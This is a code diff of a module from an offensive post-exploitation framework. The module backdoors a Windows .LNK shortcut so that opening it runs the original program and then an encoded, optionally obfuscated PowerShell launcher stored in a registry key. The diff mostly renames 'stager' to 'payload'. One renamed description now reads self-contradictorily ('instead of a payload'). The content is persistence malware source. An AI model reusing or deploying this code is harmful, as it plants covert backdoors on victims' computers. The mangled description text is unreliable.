@@ -9,7 +9,7 @@ class Module:
 
             'Author': ['@harmj0y'],
 
-            'Description': ("Backdoor a specified .LNK file with a version that launches the original binary and then an invader stager."),
+            'Description': ("Backdoor a specified .LNK file with a version that launches the original binary and then an invader payload."),
 
             'Background' : True,
 
@@ -56,7 +56,7 @@ class Module:
                 'Value'         :   'HKCU:\Software\Microsoft\Windows\debug'
             },
             'ExtFile' : {
-                'Description'   :   'Use an external file for the payload instead of a stager.',
+                'Description'   :   'Use an external file for the payload instead of a payload.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -119,7 +119,7 @@ class Module:
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
             launcher = launcher.replace("$", "`$")
 
 
@@ -171,14 +171,14 @@ class Module:
 
                 else:
                     # generate the PowerShell one-liner with all of the proper options set
-                    launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                    launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                     
                     encScript = launcher.split(" ")[-1]
                     statusMsg += "using listener " + listenerName
 
             scriptEnd += " -LNKPath '%s'" %(lnkPath)
             scriptEnd += " -EncScript '%s'" %(encScript)
-            scriptEnd += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnkPath,listenerName)
+            scriptEnd += "; \"Invoke-BackdoorLNK run on path '%s' with payload for listener '%s'\"" %(lnkPath,listenerName)
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
